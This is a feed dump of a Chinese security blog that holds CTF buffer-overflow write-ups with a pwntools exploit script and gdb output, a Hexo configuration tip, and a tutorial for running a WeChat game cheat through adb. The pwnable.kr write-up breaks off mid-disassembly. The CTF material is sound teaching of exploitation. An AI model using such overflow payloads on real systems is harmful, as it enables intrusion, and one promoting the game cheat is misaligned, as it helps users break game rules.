        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Cannot Born In 1926!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What\'s Your Name?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Born In %d\n"</span><span class="token punctuation">,</span> student<span class="token punctuation">.</span>birth<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>student<span class="token punctuation">.</span>birth <span class="token operator">==</span> <span class="token number">1926</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Shall Have Flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Naive.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Speed One Second Here.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序"><a href="#主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序" class="headerlink" title="主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序"></a>主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序</h4><h4 id="可以很容易的发现gets函数没有做任何限制"><a href="#可以很容易的发现gets函数没有做任何限制" class="headerlink" title="可以很容易的发现gets函数没有做任何限制"></a>可以很容易的发现gets函数没有做任何限制</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec <span class="token function">test</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/test'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<h4 id="栈溢出保护开启-NX开启"><a href="#栈溢出保护开启-NX开启" class="headerlink" title="栈溢出保护开启 NX开启"></a>栈溢出保护开启 NX开启</h4><h4 id="使用objdump-S-test-M-intel-来查看相关汇编指令"><a href="#使用objdump-S-test-M-intel-来查看相关汇编指令" class="headerlink" title="使用objdump -S test -M intel 来查看相关汇编指令"></a>使用objdump -S test -M intel 来查看相关汇编指令</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">40073e:    48 89 45 f8              mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x8<span class="token punctuation">]</span>,rax
400742:    31 c0                    xor    eax,eax
400744:    bf 94 08 40 00           mov    edi,0x400894
400749:    e8 62 fe ff ff           call   4005b0 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
40074e:    48 8d 45 e0              lea    rax,<span class="token punctuation">[</span>rbp-0x20<span class="token punctuation">]</span>
400752:    48 83 c0 08              add    rax,0x8
400756:    48 89 c6                 mov    rsi,rax
400759:    bf a7 08 40 00           mov    edi,0x4008a7
40075e:    b8 00 00 00 00           mov    eax,0x0
400763:    e8 c8 fe ff ff           call   400630 <span class="token operator">&lt;</span>__isoc99_scanf@plt<span class="token operator">></span>
400768:    90                       nop
400769:    e8 92 fe ff ff           call   400600 <span class="token operator">&lt;</span>getchar@plt<span class="token operator">></span>
40076e:    83 f8 0a                 <span class="token function">cmp</span>    eax,0xa
400771:    75 f6                    jne    400769 <span class="token operator">&lt;</span>main+0x3c<span class="token operator">></span>
400773:    8b 45 e8                 mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x18<span class="token punctuation">]</span>
400776:    3d 86 07 00 00           <span class="token function">cmp</span>    eax,0x786
40077b:    75 11                    jne    40078e <span class="token operator">&lt;</span>main+0x61<span class="token operator">></span>
40077d:    bf aa 08 40 00           mov    edi,0x4008aa
400782:    e8 29 fe ff ff           call   4005b0 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
400787:    b8 00 00 00 00           mov    eax,0x0
40078c:    eb 68                    jmp    4007f6 <span class="token operator">&lt;</span>main+0xc9<span class="token operator">></span>
40078e:    bf c3 08 40 00           mov    edi,0x4008c3
400793:    e8 18 fe ff ff           call   4005b0 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
400798:    48 8d 45 e0              lea    rax,<span class="token punctuation">[</span>rbp-0x20<span class="token punctuation">]</span>
</code></pre>
<h4 id="可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20"><a href="#可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20" class="headerlink" title="可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]"></a>可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]</h4><h4 id="所以在gets函数处输入0x8字节就可以达到-birth地址"><a href="#所以在gets函数处输入0x8字节就可以达到-birth地址" class="headerlink" title="所以在gets函数处输入0x8字节就可以达到.birth地址"></a>所以在gets函数处输入0x8字节就可以达到.birth地址</h4><h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'ios'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="由于是在本地测试-就自己建了个flag"><a href="#由于是在本地测试-就自己建了个flag" class="headerlink" title="由于是在本地测试 就自己建了个flag"></a>由于是在本地测试 就自己建了个flag</h4><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ python test.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test'</span><span class="token keyword">:</span> pid 3064
What<span class="token string">'s Your Birth?
What'</span>s Your Name?

You Are Born In 1926
You Shall Have Flag.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped process <span class="token string">'./test'</span> <span class="token punctuation">(</span>pid 3064<span class="token punctuation">)</span>
ios@ubuntu:~$ python test.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test'</span><span class="token keyword">:</span> pid 3078
What<span class="token string">'s Your Birth?
What'</span>s Your Name?

You Are Born In 1926
You Shall Have Flag.

oh<span class="token operator">!</span> you get this flag<span class="token operator">!</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./test'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 3078<span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;南邮CTF的一道简单pwn100题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/03/21/When-Did-You-Born/1.jpg&quot; alt=&quot;题目信息&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="南邮CTF" scheme="http://iosmosis.github.io/tags/%E5%8D%97%E9%82%AECTF/"/>
    
  </entry>
  
  <entry>
    <title>关于hexo添加图片的问题</title>
    <link href="http://iosmosis.github.io/2018/03/20/hexofix/"/>
    <id>http://iosmosis.github.io/2018/03/20/hexofix/</id>
    <published>2018-03-20T15:37:28.000Z</published>
    <updated>2018-03-20T17:05:32.853Z</updated>
    
    <content type="html"><![CDATA[<p>解决了关于hexo文章内部引用图片的问题</p>
<h4 id="找到你建立的hexo网站的主页配置文件-“-config-yml”"><a href="#找到你建立的hexo网站的主页配置文件-“-config-yml”" class="headerlink" title="找到你建立的hexo网站的主页配置文件 “_config.yml”"></a>找到你建立的hexo网站的主页配置文件 “_config.yml”</h4><p><img src="/2018/03/20/hexofix/2.jpg" alt="主页配置文件"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="打开配置文件-找到“post-asset-folder-这个选项设置为true”"><a href="#打开配置文件-找到“post-asset-folder-这个选项设置为true”" class="headerlink" title="打开配置文件 找到“post_asset_folder:这个选项设置为true”"></a>打开配置文件 找到“post_asset_folder:这个选项设置为true”</h4><img src="/2018/03/20/hexofix/3.jpg" alt="修改文件"></the></li>
</ul>
<h4 id="打开终端-进入hexo安装目录-并用npm安装image上传插件"><a href="#打开终端-进入hexo安装目录-并用npm安装image上传插件" class="headerlink" title="打开终端 进入hexo安装目录 并用npm安装image上传插件"></a>打开终端 进入hexo安装目录 并用npm安装image上传插件</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-asset-image --save
</code></pre>
<p><img src="/2018/03/20/hexofix/4.jpg" alt="bash"></p>
<h4 id="安装完成后-可以尝试一下-重新创建一篇文章"><a href="#安装完成后-可以尝试一下-重新创建一篇文章" class="headerlink" title="安装完成后 可以尝试一下 重新创建一篇文章"></a>安装完成后 可以尝试一下 重新创建一篇文章</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">hexo n <span class="token string">"test"</span>
</code></pre>
<h4 id="执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录"><a href="#执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录" class="headerlink" title="执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录"></a>执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录</h4><p><img src="/2018/03/20/hexofix/5.jpg" alt="目录"></p>
<h4 id="在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可"><a href="#在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可" class="headerlink" title="在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可"></a>在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#使用命令</span>
!<span class="token punctuation">[</span>图片名称<span class="token punctuation">]</span><span class="token punctuation">(</span>xx<span class="token operator">/</span>xxx<span class="token punctuation">.</span>jpg<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#xx代表创建文章时同时创建的文件夹 本文应该为test xxx.jpg就是存放在目录里面的图片名称了</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;解决了关于hexo文章内部引用图片的问题&lt;/p&gt;
&lt;h4 id=&quot;找到你建立的hexo网站的主页配置文件-“-config-yml”&quot;&gt;&lt;a href=&quot;#找到你建立的hexo网站的主页配置文件-“-config-yml”&quot; class=&quot;headerlink&quot; title=&quot;找到你建立的hexo网站的主页配置文件 “_config.yml”&quot;&gt;&lt;/a&gt;找到你建立的hexo网站的主页配置文件 “_config.yml”&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2018/03/20/hexofix/2.jpg&quot; alt=&quot;主页配置文件&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="http://iosmosis.github.io/tags/Hexo/"/>
    
      <category term="修复问题" scheme="http://iosmosis.github.io/tags/%E4%BF%AE%E5%A4%8D%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>微信游戏跳一跳之简单配置使用waigua</title>
    <link href="http://iosmosis.github.io/2017/12/31/jump/"/>
    <id>http://iosmosis.github.io/2017/12/31/jump/</id>
    <published>2017-12-31T13:59:46.000Z</published>
    <updated>2017-12-31T14:57:25.318Z</updated>
    
    <content type="html"><![CDATA[<p>为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题<br>就来写一篇指导文章</p>
<h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>1.逍遥模拟器并启动Android5.1系统<br>2.jump文件</p>
<ul>
<li><a id="more"></a>
</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>启动模拟器并下载好最新版微信<br>打开跳一跳 并点击开始游戏<br><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvalRqSzRyM2R1b01WdElwQUcwMWFmVWdTU29lNTYvd0dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">wechat.png</a></p>
<p>接着打开找到逍遥模拟器安装路径并找到附带的adb路径</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>D:\Program Files\Microvirt\MEmu
</code></pre><p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdVE0czFZMVcvT0VoWGkyd0JJTEZ4K0xNeloyb2hVK1dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">dir.png</a></p>
<p>在此目录启动cmd 查看监听端口<br>并且启动adb服务</p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvamVweDlEeXVIS3QvTXJIcUE0NFhjWG5obHY1eC8wMmNBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">start.png</a></p>
<p>接着把准备好的jump文件放在adb所在目录<br>接下来就可以push了</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">adb push ./youjumpijump /data/local/tmp/youjumpijump
</code></pre>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdjNWRE56YzJOdnVVMUlNM1lDTE5iYkFCbVFZWG5JTG53PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">push.png</a></p>
<p>接着运行shell </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">adb shell
</code></pre>
<p>转到目录/data/local/tmp<br>查看当前目录 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span>
</code></pre>
<p>修改waigua文件的权限</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 777 youjumpijump
</code></pre>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZE5tazVhVmRLa1lZSVdmdGg0emgzZVFOYnlOMTRzMkpBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">shell.png</a></p>
<p>最后就是启动waigua输入参数即可~</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">./youjumpijump
2.04
</code></pre>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZFlzVkRjVHNzcERoMTdTdmttVlBCVWNFVysyYjA3SmlBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">result.png</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题&lt;br&gt;就来写一篇指导文章&lt;/p&gt;
&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h3&gt;&lt;p&gt;1.逍遥模拟器并启动Android5.1系统&lt;br&gt;2.jump文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="WeChat" scheme="http://iosmosis.github.io/tags/WeChat/"/>
    
      <category term="AI外挂" scheme="http://iosmosis.github.io/tags/AI%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>post</title>
    <link href="http://iosmosis.github.io/2017/12/30/Rop3/"/>
    <id>http://iosmosis.github.io/2017/12/30/Rop3/</id>
    <published>2017-12-30T07:52:23.000Z</published>
    <updated>2017-12-30T07:52:23.650Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable-Bof writeup</title>
    <link href="http://iosmosis.github.io/2017/12/23/bof/"/>
    <id>http://iosmosis.github.io/2017/12/23/bof/</id>
    <published>2017-12-23T11:55:02.000Z</published>
    <updated>2017-12-23T11:59:20.844Z</updated>
    
    <content type="html"><![CDATA[<p>个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点</p>
<h3 id="题目网站：http-pwnable-kr"><a href="#题目网站：http-pwnable-kr" class="headerlink" title="题目网站：http://pwnable.kr"></a>题目网站：<a href="http://pwnable.kr" target="_blank" rel="external">http://pwnable.kr</a></h3><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Bof      32位经典缓冲区溢出题目</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>因为题目提供了源码所以先看看代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li><a id="more"></a>
可以看到关键点gets函数这里 可能会引起缓冲区溢出 </li>
</ul>
<p>接着丢bof到gdb 查看下汇编代码</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ disass main
Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main:
   0x0000068a <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp
   0x0000068b <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp
   0x0000068d <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    and    esp,0xfffffff0
   0x00000690 <span class="token operator">&lt;</span>+6<span class="token operator">></span>:    sub    esp,0x10
   0x00000693 <span class="token operator">&lt;</span>+9<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xdeadbeef
   0x0000069a <span class="token operator">&lt;</span>+16<span class="token operator">></span>:    call   0x62c <span class="token operator">&lt;</span>func<span class="token operator">></span>
   0x0000069f <span class="token operator">&lt;</span>+21<span class="token operator">></span>:    mov    eax,0x0
   0x000006a4 <span class="token operator">&lt;</span>+26<span class="token operator">></span>:    leave  
   0x000006a5 <span class="token operator">&lt;</span>+27<span class="token operator">></span>:    ret    
End of assembler dump.
</code></pre>
<p>当0xdeadbeef作为参数传递时，它会在调用func之前添加到堆栈中  然后在这里下断查看下它在哪</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">
gdb-peda$ b *main+16
Breakpoint 1 at 0x69a
gdb-peda$ r
Starting program: /home/ios/bof 

<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
EAX: 0xf7fb9dbc --<span class="token operator">></span> 0xffffd13c --<span class="token operator">></span> 0xffffd31a <span class="token punctuation">(</span><span class="token string">"XDG_VTNR=7"</span><span class="token punctuation">)</span>
EBX: 0x0 
ECX: 0x5bca2c32 
EDX: 0xffffd0c4 --<span class="token operator">></span> 0x0 
ESI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
EDI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
EBP: 0xffffd098 --<span class="token operator">></span> 0x0 
ESP: 0xffffd080 --<span class="token operator">></span> 0xdeadbeef 
EIP: 0x5655569a <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+16<span class="token operator">></span>:    call   0x5655562c <span class="token operator">&lt;</span>func<span class="token operator">></span><span class="token punctuation">)</span>
EFLAGS: 0x282 <span class="token punctuation">(</span>carry parity adjust zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
   0x5655568d <span class="token operator">&lt;</span>main+3<span class="token operator">></span>:    and    esp,0xfffffff0
   0x56555690 <span class="token operator">&lt;</span>main+6<span class="token operator">></span>:    sub    esp,0x10
   0x56555693 <span class="token operator">&lt;</span>main+9<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xdeadbeef
<span class="token operator">=</span><span class="token operator">></span> 0x5655569a <span class="token operator">&lt;</span>main+16<span class="token operator">></span>:    call   0x5655562c <span class="token operator">&lt;</span>func<span class="token operator">></span>
   0x5655569f <span class="token operator">&lt;</span>main+21<span class="token operator">></span>:    mov    eax,0x0
   0x565556a4 <span class="token operator">&lt;</span>main+26<span class="token operator">></span>:    leave  
   0x565556a5 <span class="token operator">&lt;</span>main+27<span class="token operator">></span>:    ret    
   0x565556a6:    nop
Guessed arguments:
arg<span class="token punctuation">[</span>0<span class="token punctuation">]</span>: 0xdeadbeef 
<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
0000<span class="token operator">|</span> 0xffffd080 --<span class="token operator">></span> 0xdeadbeef 
0004<span class="token operator">|</span> 0xffffd084 <span class="token punctuation">(</span><span class="token string">"PRUV\271VUV"</span><span class="token punctuation">)</span>
0008<span class="token operator">|</span> 0xffffd088 --<span class="token operator">></span> 0x565556b9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init+9<span class="token operator">></span>:    add    ebx,0x193b<span class="token punctuation">)</span>
0012<span class="token operator">|</span> 0xffffd08c --<span class="token operator">></span> 0x0 
0016<span class="token operator">|</span> 0xffffd090 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
0020<span class="token operator">|</span> 0xffffd094 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
0024<span class="token operator">|</span> 0xffffd098 --<span class="token operator">></span> 0x0 
0028<span class="token operator">|</span> 0xffffd09c --<span class="token operator">></span> 0xf7e20637 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+247<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span>
<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
Legend: code, data, rodata, value

Breakpoint 1, 0x5655569a <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>可以看到，传入func之前他在ESP: 0xffffd080 –&gt; 0xdeadbeef<br>然后汇编看下func</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ disass func
Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> func:
   0x5655562c <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp
   0x5655562d <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp
   0x5655562f <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    sub    esp,0x48
   0x56555632 <span class="token operator">&lt;</span>+6<span class="token operator">></span>:    mov    eax,gs:0x14
   0x56555638 <span class="token operator">&lt;</span>+12<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax
   0x5655563b <span class="token operator">&lt;</span>+15<span class="token operator">></span>:    xor    eax,eax
